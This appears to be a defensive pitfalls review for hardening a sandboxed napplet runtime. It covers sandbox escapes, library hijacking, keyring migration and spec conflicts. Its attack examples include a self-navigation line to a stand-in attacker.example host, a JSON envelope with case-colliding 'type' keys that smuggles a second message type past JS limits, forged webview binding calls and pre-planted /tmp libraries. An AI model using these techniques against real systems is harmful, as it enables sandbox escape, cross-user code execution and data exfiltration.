# Pitfalls Research

**Domain:** Hardening a sandboxed-iframe napplet runtime (Go backend + Gio desktop host + per-window WebKitGTK/WebView2/WKWebView child + gomobile Android) and conforming it strictly to moving draft specs (NIP-5D, NAP-*, WEB-NAPPLET)
**Researched:** 2026-10-02
**Confidence:** HIGH for findings marked *verified in code/spec* (read directly from this repo, `~/Projects/napplet` at `956135bf`, the pinned NIP-5D `24711d9` and WEB-NAPPLET `7ae5b19` texts). MEDIUM for engine and OS behavior backed by web sources. LOW where marked.

Workstream labels used below: **conformance**, **shim upgrade**, **sandbox**, **desktop process**, **secrets**, **robustness**, **storage**. One more, **ground truth**, is recommended as a short first step (Pitfall 1).

---

## Critical Pitfalls

### Pitfall 1: Planning from stale documents. The code is already ahead of PROJECT.md and NAPPLETS.md

**What goes wrong:**
Phases get scoped against work that has already been done, and the real deviations get missed. *Verified in code:*
- `backend/webview/embed.go` has `ShimVersion = "0.30.0+verdana.2"`. `backend/webview/shim/README.md` says the shim is **0.30.0 with six Verdana patches**: a NAP-INTENT lifecycle-independent delivery API, legacy `bytesMany` strings, no shim-side request deadline (`napRequestTimer`), INC query checks, NOTIFY control replay, and a NAP-SHELL global. PROJECT.md ("upgrade 0.29.2→0.30.0", "vendored unmodified") and NAPPLETS.md ("0.29.2, copied unmodified") are both wrong.
- The README's recorded sha256 (`6d98d7…`) does not match the file on disk (`8e9c3f7b…`).
- NAP-STORAGE keying is mostly done already. `napStoreID` in `backend/nap_basic.go` hashes `napp.ID + "\x00" + ArtifactHash` (commit `18f8f81`). The remaining deviation is the **legacy fallback**: when `ArtifactHash == ""`, it falls back to the address key.
- NAPPLETS.md says `notify` and `config` are unimplemented. Both are in `napDomains` and both have handlers.

**Why it happens:** the project docs were written from memory and from NAPPLETS.md, not from the tree. The vendored shim is a patched fork, but nothing in the repo enforces that.

**How to avoid:** before roadmap phase 1, run a half-day **ground-truth pass**:
- Diff the vendored prelude against upstream `@napplet/shim@0.30.0` `dist/prelude.global.js` and record every hunk as a named patch.
- Fix the README hash.
- Add a Go test asserting `sha256(prelude.global.js)` equals a constant in `embed.go`. Any edit then forces a deliberate version and README bump.
- Re-scope the "shim upgrade" requirement to **"reconcile the patched 0.30.0 fork with the pinned specs"**.
- Re-scope "storage rekey" to **"remove the legacy fallback and backfill ArtifactHash"**.

**Warning signs:** a requirement that is already satisfied by `git grep`. Docs naming versions that are not in `embed.go`.

**Phase to address:** ground truth (first), then conformance.

---

### Pitfall 2: The napplet frame can reload or navigate itself, which breaks identity binding, the CSP, and the session

**What goes wrong:** three related holes.
1. **Self-navigation escapes the CSP.**
   - A napplet runs `location.href = "https://attacker.example/…"`. A sandbox without `allow-top-navigation` still lets a frame navigate *itself*.
   - The new document has no injected CSP meta. It keeps the opaque origin but has full `fetch`/WebSocket access.
   - It is still `frame.contentWindow`, so the host page check `event.source === frame.contentWindow` (`backend/webview/napplet-host.js`) passes.
   - The Go session stays `established`, so the attacker page can send NAP envelopes and receives every `__nap_push` (relay events, identity, storage results).
   - NIP-5D binds identity to "the exact bytes that run". That binding is now false.
2. **The host page's CSP is a no-op.** `desktop/child/napplet.go` sets `Content-Security-Policy: navigate-to 'self'`. `navigate-to` was removed from CSP3 in 2022 and never shipped in any engine, so the host page effectively has no policy.
3. **A self-reload hangs the napplet.**
   - `location.reload()` re-runs the srcdoc preamble, which posts `shell.ready`.
   - `napReady` in `backend/nap.go` ignores a repeated `shell.ready` while `established`. Only Go-initiated `napReset` (dev reload, `backend/dev.go`) resets the session, and the host page never sends `nap.reset`.
   - So the new document never gets `shell.init`, and the Verdana no-timeout shim patch makes it wait forever.
   - Meanwhile the old document's subscriptions keep pushing into the new one.
   - NIP-5D explicitly requires injection "before any napplet script runs, including … reloads". The comment in `napplet-host.js` ("A napplet that reloads itself starts over with a new shell.ready, which Go takes as a new session") contradicts `nap.go`.

**Why it happens:** the design assumes the srcdoc document is the only document the frame will ever hold. CSP has no working navigation control, and `MessageEvent.source` identifies a *browsing context*, not a document.

**How to avoid:**
- In `napplet-host.js`, listen for the iframe's `load` event. Every load after the one `boot()` started means a new document. Call `rpc("nap.reset")` before forwarding anything else, then either re-boot from Go's verified srcdoc or tear the frame down. Drop envelopes between the unexpected load and the reset.
- Replace `navigate-to 'self'` on the host page response with `frame-src 'none'; child-src 'none'` or similar.
  - The parent's `frame-src` is enforced on the child frame's navigations, including self-initiated ones. `about:srcdoc` is not fetched, so the napplet still loads.
  - The srcdoc document inherits this policy, so it must stay compatible with the NIP-5D napplet CSP. Inline script stays allowed because the napplet CSP is the one that restricts it.
  - Verify on all three engines (MEDIUM confidence that WebKitGTK and WKWebView behave like Chromium here).
- Add a regression test napplet (`backend/testdata/`) that tries `location.reload()`, `location.href = "data:…"`, and `location.href = "https://…"`. Assert it is reset or blocked, never served.

**Warning signs:** a napplet that is blank after reload. "napplet session started" logged only once per window. Any outbound network request from a napplet window in the WebKit inspector.

**Phase to address:** sandbox (main), conformance (record NIP-5D "including reloads" as fixed).

---

### Pitfall 3: Fixing `extractChild` alone leaves the same hijack open in go-webview's `embedded` package

**What goes wrong:** *verified in module source.*
- `desktop/child/main.go` imports `github.com/abemedia/go-webview/embedded`. Its `init()` does the following before `main`:
  - writes `libwebview.so`/`.dylib`/`webview.dll` to `os.TempDir()/webview-0.12.0/` with `os.ModePerm`;
  - **reuses any existing file without checking it**;
  - sets `WEBVIEW_PATH` (Unix), or **prepends that temp dir to `PATH`** (Windows), then `dlopen`s it.
- On a multi-user Linux or macOS machine, another user who pre-creates `/tmp/webview-0.12.0/libwebview.so` gets code execution inside every Verdana napplet window. On Windows, prepending a writable dir to `PATH` widens DLL search-order hijacking.
- `libraryPath()` also searches the **executable's own directory**, which today is the shared `/tmp/verdana-child/`.
- `desktop/childproc.go` `childExePath()` falls back to the CWD-relative paths `./child/child` and `child/child` when extraction fails. A prod build launched from an attacker-controlled directory, such as an unpacked download, runs that directory's binary.

**Why it happens:** the CONCERNS.md audit looked at Verdana's code, not at third-party `init()` side effects. Init-time extraction can't be configured from `main`.

**How to avoid:**
- Remove the `embedded` import. Embed the library bytes in Verdana (or depend on the system WebKitGTK plus a vendored `libwebview`). Extract **both** the child binary and the library into one per-user directory:
  - Linux: `os.UserCacheDir()/verdana/child-<full sha256>/`, or `$XDG_RUNTIME_DIR`.
  - macOS: `~/Library/Caches`.
  - Windows: `%LOCALAPPDATA%`.
- Set the directory to `0700`, and `Lstat`-check owner and mode before trusting it.
- Write each file via temp file + `fsync` + rename. Name it with the **full** hash, not `hash[:4]`.
- Before reuse, re-hash the existing file and replace it on mismatch.
- Set `WEBVIEW_PATH` explicitly to that directory in the child's environment (`exec.Cmd.Env`).
- Delete the CWD fallbacks in prod builds and fail loudly instead.
- On Windows, never rewrite a running exe in place. Content-hash names avoid that, and stale versions should be cleaned up lazily, ignoring errors.

**Warning signs:** `ls -ld /tmp/webview-*` shows a directory owned by another user. `strace -f -e openat` on the child shows libraries loaded from `/tmp`.

**Phase to address:** desktop process.

---

### Pitfall 4: Assuming the WebKitGTK result holds on every engine (binding reachability and init-script injection)

**What goes wrong:**
- NAPPLETS.md documents that WebKitGTK exposes `window.webkit.messageHandlers` to the sandboxed frame. The per-window token in `desktop/child/napplet.go` mitigates that.
- WKWebView script message handlers are also exposed to subframes (MEDIUM). WebView2 lets iframes call `chrome.webview.postMessage` (delivered on the frame-level event), and `AddScriptToExecuteOnDocumentCreated` runs in child frames (LOW to MEDIUM).
- Nobody has verified the token defense on macOS or Windows.
- WebView2 runs init scripts **inside the napplet frame**, before the napplet's CSP meta. Today they return early on `window !== window.top`. Any future init script that forgets that guard injects launcher code into the napplet. That breaks NIP-5D Security #5 ("injection MUST be limited to the `window.napplet` namespace").
- A frame without the token can spam forged binding calls. Each one logs a `Warn`, so a napplet can flood the logs and the CPU.

**How to avoid:**
- Build an adversarial napplet fixture that tries to:
  - call `window.webkit.messageHandlers.__webview__.postMessage(...)`, `window.chrome.webview.postMessage(...)`, and `window.__verdana_napplet_rpc(...)` directly;
  - read `window.top.__verdanaNappletRPC`;
  - post envelopes with `source` spoofing via nested frames (blocked by `frame-src 'none'`).
- Run it on Linux, Windows, and macOS CI runners. The desktop workflow already has the matrix. A manual run is acceptable if headless webviews are impractical, but record the result in the audit checklist.
- Rate-limit the "rpc without the window token" log line.
- Add a lint test that every `w.Init(...)` script starts with the top-frame guard.

**Warning signs:** the "napplet window: rpc without the window token" warning never appears in tests. That means the attack path was never exercised.

**Phase to address:** sandbox.

---

### Pitfall 5: Treating the CSP as a network boundary, then "fixing" its gaps in a way that violates NIP-5D

**What goes wrong:**
- `connect-src 'none'` does not govern WebRTC. `RTCPeerConnection` with an attacker STUN/TURN server leaks data through ICE and DNS, and the CSP `webrtc` directive has not shipped anywhere (MEDIUM).
- DNS prefetch and other side channels also bypass CSP.
- The tempting fix is to `delete window.RTCPeerConnection` in the srcdoc preamble. NIP-5D says runtime injection "MUST be limited to the `window.napplet` namespace", so that fix is itself a MUST violation.

**How to avoid:**
- Prefer engine-level switches over JS:
  - WebKitGTK: `enable-webrtc` defaults to off. Assert that it stays off in the child.
  - WebView2: browser arguments such as `--force-webrtc-ip-handling-policy=disable_non_proxied_udp`, or a feature-disable flag. Research is needed (LOW confidence on the exact flag).
  - WKWebView: configuration preferences.
- Record the residual risk in the audit checklist under NIP-5D "Non-Guarantees: side channels" rather than hacking the preamble.
- Remember that NAP itself is a sanctioned exfiltration path: `resource.bytes` with an https URL after one prompt, and `link.open`. The prompts and netguard are the real boundary.

**Phase to address:** sandbox (engine flags), conformance (record the decision).

---

### Pitfall 6: Strict conformance to specs that contradict each other

**What goes wrong:** *verified in the pinned spec texts.*
- **Kind 35129:** NIP-5D defines 35129 with NIP-5A `path` tags, an aggregate `x`, and `requires`. WEB-NAPPLET (lines 220-228) says a runtime "MUST reject a kind `35129` event containing a `path`, `requires`, or `C` tag". `backend/napplet.go` already dispatches on the presence of `path`, which is a silent deviation from WEB-NAPPLET.
- **Identity tuple:** NIP-5D and NAP-STORAGE use `(dTag, aggregateHash)`. WEB-NAPPLET binds `(35129:<pubkey>:<d>, artifactHash)`. Verdana's `napp.ID` is `<16hex>~<d>`: a truncated pubkey plus the d tag.
- **Capability tags:** NIP-5D says `requires` SHOULD reject or warn. WEB-NAPPLET says `R`/`O` MUST NOT gate loading or produce warnings.
- **Oracles:** `@napplet/conformance` and shim 0.30.0 follow **merged master** (`intent.invoke`, intent delivery removed in shim 0.28.0). Verdana pins NAP-INTENT to draft PR #91 (lifecycle-independent delivery) and re-adds delivery with a local patch. The reference tools are therefore *not* an oracle for every pinned domain.

**How to avoid:**
- Make the checklist **per manifest shape** (NIP-5D vs WEB-NAPPLET) and per spec.
- Add a "Conflicts" section that cites both clauses with their SHAs and the chosen resolution. For example: "35129 with `path` → NIP-5D rules; deviation from WEB-NAPPLET §Legacy Events recorded".
- Keep NIP-5D `requires` as **warn**, not reject. That satisfies the SHOULD with the least breakage.
- Use `@napplet/conformance` only for domains whose pin matches merged master.

**Warning signs:** a checklist row that cites only one spec for behavior that two specs touch.

**Phase to address:** conformance.

---

### Pitfall 7: Pin drift. Pinned SHAs become unfetchable, or a shim pin and a spec pin disagree

**What goes wrong:**
- Most NAP pins are `refs/pull/N/head` of draft PRs. A force-push leaves the old SHA unreachable, and GitHub can eventually garbage-collect it, so "re-fetch by SHA" stops working.
- The local `~/Projects/nips` checkout did not contain `24711d9` until it was fetched explicitly.
- The shim pin (`napplet/web@956135bf`) tracks merged naps master plus amendments, while domain pins track PR heads. "Upgrade shim to match pinned head" has no single target.

**How to avoid:**
- Snapshot each pinned spec file's text into the repo (for example `.planning/research/specs/<NAP>@<sha>.md`) so the audit is reproducible offline.
- For each domain, record which shim source revision implements it, and whether a Verdana patch bridges the gap.
- Re-pin only through a deliberate SPEC-PINS.md change with a diff summary.

**Phase to address:** conformance (first task).

---

### Pitfall 8: Shim changes plus "silently ignore unknown types" plus "no shim deadline" make napplets hang forever

**What goes wrong:**
- NIP-5D requires unknown types to be silently ignored. Verdana's patch removed the shim's request timeouts so that prompts can wait.
- Together, these mean any request type the vendored shim can emit, but the launcher does not handle, **hangs the napplet with no error**.
- A shim upgrade adds methods within already-installed domains. 0.30.0, for example, changed `resource.bytesMany` from `urls` to `requests` and added `servers`. Verdana's handler already accepts both shapes.
- Error shapes are duplicated in `napCall.fail()` (`nap.go`) and `refuse()` (`napplet-host.js`) with a comment saying "Mirrors napCall.fail", so they drift on every upgrade.

**How to avoid:**
- Add a Go test that extracts every `type: "<domain>.<action>"` request literal from `prelude.global.js` for the domains in `napDomains`, and asserts a handler exists in `napHandlers` (or is listed as push-only).
- Generate the per-type error-reply table once in Go. Send it to the host page in `nap.boot` so `refuse()` uses the same table.
- Stay liberal in accepted shapes. Napplets can bundle `@napplet/nap` transports directly, so old wire shapes such as `urls` arrive from napplets in the wild, not only from the vendored shim. Stay strict in emitted shapes.
- Keep every Verdana patch as a named, documented hunk (Pitfall 1). Re-apply them after the upstream diff, and re-run `shim_test.go`, which uses node when it is installed.

**Warning signs:** a napplet spinner that never resolves. A "ignoring unknown NAP message" debug log for a type that appears in the prelude.

**Phase to address:** shim upgrade, conformance.

---

### Pitfall 9: "Every request gets a reply" is enforced by convention, not structure

**What goes wrong:** NAP-STORAGE and others say the shell "MUST respond to every request". The dispatcher's `recover` → `c.fail()` covers panics only. A handler that `return`s early on an unexpected path, or an `async` closure that exits on `ctx.Done()` without replying, leaves the napplet waiting forever. The no-deadline shim makes this a hang, not a timeout.

**How to avoid:**
- Track an `answered` flag on `napCall`, set by `reply`/`replyAs`.
- When a synchronous handler returns without replying and without starting `async`, the dispatcher auto-sends `fail()`. `async` does the same when its function returns.
- Exempt reply-less types explicitly, such as `*.close` and `inc.emit`, through the registration table (see Pitfall 10).
- On session reset, staleness is fine: the old document is gone.

**Phase to address:** robustness, conformance.

---

### Pitfall 10: Centralized permission gating that is too coarse grows an escape hatch

**What goes wrong:**
- Permissions are often decided per payload. `resource.bytes` needs a grant for `https:` but not for `data:`. `relay.publish` depends on the event kind. `upload` depends on login state.
- A "one permission per type at registration" design pushes developers to register `PermNone` for these types and keep `askApproval` inside the handler. That defeats the purpose.
- A gate in both the dispatcher and the handler double-prompts.

**How to avoid:**
- Registration takes a **policy value**:
  - `Static(perm)`: enforced by the dispatcher.
  - `Dynamic(reason)`: the handler gates; the test asserts the handler calls `askApproval` or `sessionGrant` on the gated path.
  - `None(reason)`: the reason is mandatory and reviewed.
- `handleNap` rejects registrations without a policy at init (keep the existing init-time panic style).
- Add a test listing every type with its policy, as a golden file, so a new handler shows up in review.
- Keep `sessionGrant` semantics: one prompt per session per permission.

**Phase to address:** sandbox.

---

### Pitfall 11: Limits enforced in JS only, and Go's case-insensitive JSON lets an envelope pass the JS limit and act as a different type in Go

**What goes wrong:**
- Size bounds live in `napplet-host.js`: 1 MiB, or 24 MiB when `data.type === "upload.upload"`. Go's `encoding/json` matches struct field names **case-insensitively**, and the last matching key wins (HIGH, documented Go behavior).
- So `{"type":"upload.upload","TYPE":"relay.publish",…}` passes the JS 24 MiB check, and `napEnqueue` in Go decodes it as `relay.publish`.
- `ID json.RawMessage` is echoed verbatim in every reply. A 1 MiB object id is reflected on every push.
- Android's channel path and any future token leak bypass the JS host entirely.

**How to avoid:**
- Enforce limits in Go after decoding `Type`: a per-type max envelope size, an `id` that must be a string or number of at most 128 bytes, plus array counts, string lengths, filter counts, subscription counts per session, and push rate.
- Reject envelopes whose top-level keys collide case-insensitively. Alternatively, decode `type`/`id` with a case-sensitive scan.
- Add one regression test per bound in `backend/nap_test.go`.

**Phase to address:** robustness.

---

### Pitfall 12: Unix socket instance listener. Stale sockets, unlink races, path length, and a directory that was never 0700

**What goes wrong:**
- **Stale socket races:** "if bind fails, remove the stale socket and retry" races between two cold starts. One removes the other's live socket, leaving an unreachable primary.
- **Path length:** `sun_path` is 104 bytes on macOS and 108 on Linux. `~/Library/Application Support/verdana/…` or a macOS `$TMPDIR` under `/var/folders/...` can overflow it. Go reports `bind: invalid argument`.
- **Socket permissions:** some BSD-derived systems historically ignore socket file permissions. Only the **directory** mode is a portable guard.
- **Existing directories:** `os.MkdirAll(dir, 0700)` does not tighten a directory that already exists. `backend/backend.go` creates `dataDir` with `0755`, so older installs may have a world-readable data dir.
- **Upgrade window:** an old instance (TCP listener) is still running after an update. The new binary's socket forward fails, `instancelock` is held, it retries for 3 s, then logs "leaving it as the sole instance". The user's shortcut click silently does nothing until they quit the tray app.

**How to avoid:**
- Order startup as: acquire `instancelock`, unlink the stale socket, listen. This is safe because the lock serializes it.
- Place the socket in a short path: `$XDG_RUNTIME_DIR/verdana/` on Linux, and a short per-user directory on macOS. Check `len(path) < 100`.
- Before use, `Lstat` the directory and verify it is owned by `os.Getuid()` with mode `&077 == 0`. `chmod` it otherwise.
- Optionally verify peer credentials (`SO_PEERCRED` / `getpeereid`).
- For one release, keep a **client-side** fallback that reads the legacy `launcher.port` and sends the full command form. Remove only the **server-side** token-only acceptance.
- On successful startup, delete `launcher.port`.
- Add tests: concurrent cold start, a stale socket left behind, a too-long path, and an insecure directory.

**Phase to address:** desktop process.

---

### Pitfall 13: Windows named pipe defaults are not "user-only"

**What goes wrong:**
- The default named-pipe DACL grants **read to Everyone and anonymous**.
- The **first** `CreateNamedPipe` instance fixes the security descriptor for all later instances, so a squatter that creates the pipe first owns it.
- Without `PIPE_REJECT_REMOTE_CLIENTS`, the pipe is reachable over SMB.
- Rolling this with raw `x/sys/windows` calls is error-prone.

**How to avoid:**
- Option 1, a named pipe:
  - Use `Microsoft/go-winio` `ListenPipe` with an explicit SDDL (`D:P(A;;GA;;;<current user SID>)`).
  - Require first-instance semantics (`FILE_FLAG_FIRST_PIPE_INSTANCE`) and reject remote clients.
  - Put the user SID or session ID in the pipe name.
  - On the client, verify the server process's owner (`GetNamedPipeServerProcessId` plus a token check) before sending a token.
- Option 2, AF_UNIX: Go supports it on Windows 10 1803+. Put the socket in `%LOCALAPPDATA%\verdana\`, which inherits the profile ACL. This is simpler and has no new dependency (MEDIUM: validate the ACL inheritance on a real machine).
- Either way, keep `go-winio` in the **desktop** module only (see Pitfall 16).

**Phase to address:** desktop process.

---

### Pitfall 14: Keyring migration that logs users out, breaks bunker pairings, or quietly re-plaintexts secrets

**What goes wrong:** *verified in code plus MEDIUM/LOW platform behavior.*
- **`ClientKey` is a secret too.** `ClientKey` in `backend/launcher_state.go` is the NIP-46 client keypair. If it is lost or regenerated, every bunker login breaks: the remote signer authorized the old client pubkey.
- **Failure states collapse into one.** `loadState` generates a new `ClientKey` whenever none is present. If a keyring read fails transiently, the code would conclude "no key", regenerate, and overwrite the pairing. Causes include gnome-keyring still locked at autostart, D-Bus not ready, or the user cancelling the unlock prompt.
- **`state.json` is fragile today.** `loadState` ignores `json.Unmarshal` errors and `saveState` uses non-atomic `os.WriteFile`. A crash mid-write gives a corrupt file, which loads as defaults with a new key, and that gets saved over everything.
- **Wrong migration order.** Clearing the plaintext copy before the keyring write is read back leaves no copy anywhere. Clearing it afterwards still leaves old bytes on disk: SSD/COW filesystems and backups. Do not claim secure erase.
- **macOS:** `zalando/go-keyring` shells out to `/usr/bin/security`, so item ACLs trust that tool rather than Verdana (LOW to MEDIUM). Verdana's macOS builds are unsigned raw binaries (no codesign step in `desktop.yml`). The usual result is either other user processes can read the item without a prompt, or the user is prompted after every rebuild. Check whether the library version passes the secret via stdin rather than argv.
- **Linux:** there may be no Secret Service at all on headless systems or minimal WMs such as Hyprland or sway without gnome-keyring or KeePassXC. A locked collection pops an unlock prompt that **blocks the calling goroutine**, which is fatal if it is Gio's UI goroutine. Flatpak needs `--talk-name=org.freedesktop.secrets` or the portal/libsecret file backend.
- **Windows:** Credential Manager blobs are capped at about 2.5 KB. Check the persistence type so the nsec does not roam with enterprise profiles (LOW).
- **Android:** this is shared backend code. A "no keyring → warn" path would show a warning on every Android launch. A "migrate out of `state.json`" path with no store would log Android users out.

**How to avoid:**
- Put a small interface in the backend, such as `SecretStore{Get, Set, Delete}`, discovered through an **optional interface on `Host`** (type assertion). That way the gomobile `UI` interface and the Kotlin code don't change. Implement it in the `desktop` module only.
- Distinguish **NotFound**, **Unavailable**, and **Locked/Timeout**:
  - Regenerate `ClientKey` only on a confirmed NotFound with no plaintext copy.
  - On Locked or Timeout, keep running with the in-memory or plaintext value and retry later. Never downgrade a keyring-held secret to plaintext automatically.
- Migrate in this order:
  1. Write to the keyring.
  2. Read it back and compare.
  3. Set a marker such as `secrets_location: "keyring"` in `state.json`.
  4. Rewrite `state.json` without the secret fields: `json:"-"` plus a separate legacy struct for reading.
- Make `saveState` atomic (temp + fsync + rename, as `storagePersistLocked` already does). Make `loadState` refuse to overwrite a file it failed to parse: back it up as `state.json.corrupt-<ts>`.
- Run keyring calls off the UI goroutine with a timeout.
- Show the plaintext-fallback warning on desktop only, and only once per reason.
- Document the downgrade behavior: older binaries see no login and no `ClientKey`.

**Warning signs:** "generated new client key" logged on an existing install. Bunker users asked to re-pair after an update. `state.json` still containing `client_key` after migration.

**Phase to address:** secrets (with a robustness sub-task for atomic state writes).

---

### Pitfall 15: Storage rekey framed as a one-time reset when it is really a reset on every update

**What goes wrong:**
- NAP-STORAGE says "different versions of the same napplet MUST have isolated storage". Under strict keying, **every napplet update resets its shared storage**, not just this upgrade. A "one-time notice" sets the wrong expectation.
- **Trial promotion:** `persistTrialStorage` promotes into the `storeID` computed from the **trial's** `ArtifactHash`. If install then fetches a newer event, the promoted data lands in a namespace the installed version never reads. It also overwrites any existing data in that namespace wholesale.
- **Dev reload:** `DevLoadFolder` sets `ArtifactHash` from the file hash (`backend/dev.go`), so every dev reload changes the namespace. Developers will report "storage is broken".
- **Legacy records:** the legacy fallback (`ArtifactHash == ""`) keeps old installs on address keys indefinitely.
- **Notice on Android:** if the notice is drawn only by the Gio host, Android users lose data silently.
- **Deleting legacy files** on first run makes a bad migration unrecoverable.
- **`config` keying:** `napconfig.Register(napp.ID, napp.ArtifactHash, …)` keys `config` the same way. Decide whether NAP-CONFIG values should survive updates. Check the pinned NAP-CONFIG text rather than inheriting storage's rule.
- **Filename collisions:** `safeFileName` collapses distinct IDs, for example `a/b` and `a_b`, into one file. That is safe for the hex `napplet-<sha>` IDs but not for the legacy address IDs.

**How to avoid:**
- Backfill `ArtifactHash` for installed napplets at load, from stored `Paths`: the aggregate for NIP-5D, the single `x` for WEB-NAPPLET. Then remove the fallback.
- Compute the trial `storeID` against the *installed* artifact hash at promotion time. Merge or refuse instead of overwriting.
- Choose and record a dev-mode policy. Either key dev napplets by `dev~<id>` with a recorded deviation (dev only), or accept the reset and show "storage reset (new build)" in the Dev tab.
- Produce the notice from **backend state**, for example a `State().Notices` entry with a persisted dismissed flag set on *dismiss*, not on display. Show it only when legacy address-keyed files exist.
- Keep legacy files for at least one release, then garbage-collect them.
- Change the update UI to say "Updating resets this napplet's saved data". Keep the previous version's namespace until a GC pass so a rollback restores it.

**Phase to address:** storage (UI copy also touches conformance and desktop/Android hosts).

---

### Pitfall 16: Breaking the Android gomobile build while hardening the shared backend

**What goes wrong:**
- `.github/workflows/android.yml` runs only on `workflow_dispatch`, so **no PR checks Android**.
- `GOOS=android` implies the `linux` build tag, so any `*_linux.go` file or Linux-only dependency added to `backend/` compiles into the AAR. That includes a keyring library (go-keyring's Unix backend uses godbus), `x/sys/unix` socket code, `/proc` or `$XDG_RUNTIME_DIR` assumptions, and peer-credential checks.
- A plain cross-compile check doesn't work either: `lmdb-go` is cgo and needs the NDK.
- Changes to `backend.Host` or to the exported `mobile.UI` interface fail only at `just apk` or Kotlin compile time.

**How to avoid:**
- Keep all OS hardening (keyring, sockets, pipes, extraction, OpenLink exec) in the `desktop` module. The backend gets interfaces only.
- Add new host capabilities as **optional interfaces** detected by type assertion, so the mobile adapter needs no change.
- Add a `pull_request` trigger to `android.yml`, path-filtered to `backend/**` and `android/**`.
- Put shared validation in the backend (OpenLink scheme check, envelope bounds) so Android inherits it for free.

**Warning signs:** a backend PR that adds an import of `golang.org/x/sys/unix`, `godbus`, `go-keyring`, or `go-winio`.

**Phase to address:** every phase touching `backend/`. Make the CI change in the first phase.

---

### Pitfall 17: OpenLink validated with a prefix check

**What goes wrong:**
- `gioHost.OpenLink` in `desktop/host.go` passes raw strings to `xdg-open`, `open`, or `rundll32 url.dll,FileProtocolHandler`.
- A `strings.HasPrefix(url, "http")` check passes `httpx:`, `http:\\host` quirks, and URLs with embedded newlines or control characters. On Windows, UNC or `file:` targets can leak NTLM.
- `cmd.Start()` without `Wait()` leaves a zombie per click on Unix.

**How to avoid:**
- Put a shared `backend.ValidateExternalURL`:
  - `url.Parse`, then `Scheme ∈ {http, https}` (lowercased);
  - non-empty `Host`, no userinfo, no control characters or whitespace;
  - re-serialize with `u.String()` and pass that.
- Call it from `gioHost.OpenLink`, from the mobile host adapter, and from the existing callers.
- Reap the process with `go cmd.Wait()`.

**Phase to address:** desktop process.

---

### Pitfall 18: Stricter validators silently brick napplets already in the wild or already installed

**What goes wrong:**
- WEB-NAPPLET says malformed `z`/`i`/`R`/`O` tags MUST invalidate the event, and it fixes exact tag cardinalities. Icons MUST be positively decoded, and an unverified icon MUST NOT render.
- Tightening these can turn installed napplets into load failures at startup or on update. That can surface as a crash, a vanished entry, or a hung store window.

**How to avoid:**
- Before shipping, run the new validators against a snapshot of all 35129/15129/5129 events currently on the default relays, saved as a `backend/testdata/` fixture. Count and review the rejections.
- For an installed napplet that now fails validation, keep it listed as "incompatible with this version (reason)". Keep its data, and never panic.
- Note that NIP-5D lists kind `5129` (snapshot). Decide whether it is supported, and record it.

**Phase to address:** conformance.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Patching the vendored shim in place without a recorded patch list | Fast fixes (no-timeout, intent delivery) | Every upstream upgrade silently drops or conflicts with patches; README and hash drift (already happened) | Only with a hash-pinned test and named hunks in `shim/README.md` |
| Duplicated error-reply tables in `nap.go` and `napplet-host.js` | No extra rpc | Drift, so napplets get wrong reply types and hang | Never past this milestone; generate from Go |
| Legacy storage fallback for `ArtifactHash == ""` | No data loss for old installs | Permanent non-conformance, plus two code paths | One release, with backfill |
| Keeping the TCP server for "rolling upgrade" | Shortcuts work across versions | Unauthenticated local attack surface | Never (server); client-side fallback for one release only |
| Deleting JS globals in the srcdoc preamble to close CSP gaps | Blocks WebRTC exfiltration | Violates NIP-5D injection MUST; napplets can detect it | Never; use engine flags and record the residual risk |
| `os.WriteFile` for `state.json` | Simple | Corrupt state can lead to a regenerated `ClientKey` and broken bunker logins | Never once secrets or markers live there |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| abemedia/go-webview `embedded` | Importing it (init extracts to shared `/tmp`, edits `PATH`) | Drop the import; extract the lib yourself into a 0700, hash-verified per-user directory; set `WEBVIEW_PATH` in the child env |
| WebKitGTK | Assuming `INJECT_TOP_FRAME` init scripts mean message handlers are top-only | Handlers are reachable from all frames; keep the per-window token; keep `enable-webrtc` off |
| WebView2 | Init scripts without a `window.top` guard | WebView2 injects into child frames; guard every script; test iframe `chrome.webview.postMessage` |
| WKWebView | Assuming macOS matches WebKitGTK without testing | Run the adversarial fixture on macOS; handlers are exposed to subframes |
| Secret Service (godbus) | Synchronous call on the UI goroutine; treating "locked" as "absent" | Background call with a timeout; three-state result |
| macOS Keychain via `/usr/bin/security` | Assuming items are app-private | ACL trusts `security`; unsigned rebuilds prompt; document it, or sign builds and use the native API |
| Windows Credential Manager | Storing a large JSON blob | Store individual small secrets (about 2.5 KB cap); check the persistence type |
| `@napplet/conformance` | Using it as the oracle for draft-PR-pinned domains | It follows merged master; use it only where the pins match |
| gomobile | Adding methods to `backend.Host` / `mobile.UI` | Optional interfaces via type assertion; Android CI on PRs |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| One `eval` per pushed envelope (`napPushGen`) over child stdin JSON | UI jank and child CPU spikes on busy relay subscriptions | Batch pushes per tick; cap subscriptions per session and events per second | Hundreds of events per second (a global feed napplet) |
| Re-hashing the child binary and lib at every launch | Slower cold start | Hash once per start, which is cheap for about 10-30 MB; never skip verification | Not a real problem; do not "optimize" it away |
| `napEnqueue` blocking on a full 256-slot queue | Host page rpc stalls | Fine as backpressure, but bound per-type sizes so the queue can't hold 256 × 24 MiB | A malicious napplet spamming upload envelopes |
| Keyring calls at startup | Launcher appears frozen behind an unlock dialog | Async with a timeout; start logged-out-pending | First login after boot with a locked keyring |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Trusting `event.source` after the frame navigated | An attacker page drives NAP with full network access | Frame `load` → `nap.reset`; host `frame-src 'none'` |
| A host page "CSP" built on `navigate-to` | No policy at all | Real directives; test that they are enforced |
| Leaving third-party init-time extraction in place | Cross-user code execution | Remove the `embedded` import |
| CWD-relative child fallback in prod | Runs an arbitrary binary | Fail closed |
| Socket in an existing 0755 directory | Other local users can connect | `Lstat` owner and mode check plus `chmod` |
| Named pipe with the default DACL | Cross-user and remote access, squatting | Explicit SDDL, first-instance flag, reject remote clients |
| Regenerating `ClientKey` on a transient keyring error | Silently breaks bunker logins | Three-state errors; never regenerate unless confirmed absent |
| Size limits only in JS | Bypass via Go case-insensitive keys or the Android path | Go-side per-type bounds |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| "One-time" storage reset notice | Users lose data again on the next napplet update and feel misled | Say it once at upgrade, then warn at each update ("resets saved data") |
| Notice shown only on desktop | Android users lose data silently | Backend-produced notice consumed by both hosts |
